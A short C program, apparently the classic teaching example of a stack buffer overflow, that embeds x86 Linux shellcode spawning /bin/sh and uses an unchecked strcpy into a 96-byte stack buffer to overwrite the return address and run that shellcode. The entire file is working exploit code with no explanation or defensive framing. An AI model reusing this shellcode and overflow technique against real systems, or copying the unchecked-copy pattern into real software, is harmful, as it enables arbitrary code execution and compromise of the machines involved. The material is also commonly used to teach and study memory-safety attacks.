#include <stdio.h>

char shellcode[] =
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];
int i;
long *long_ptr;

int main() {
  char buffer[96];

  long_ptr = (long *)large_string;
  for (i=0; i<32; i++)
    *(long_ptr+i) = (int)buffer;
  for (i=0; i<(int)strlen(shellcode); i++)
    large_string[i] = shellcode[i];
  strcpy(buffer, large_string);
  return 0;
}
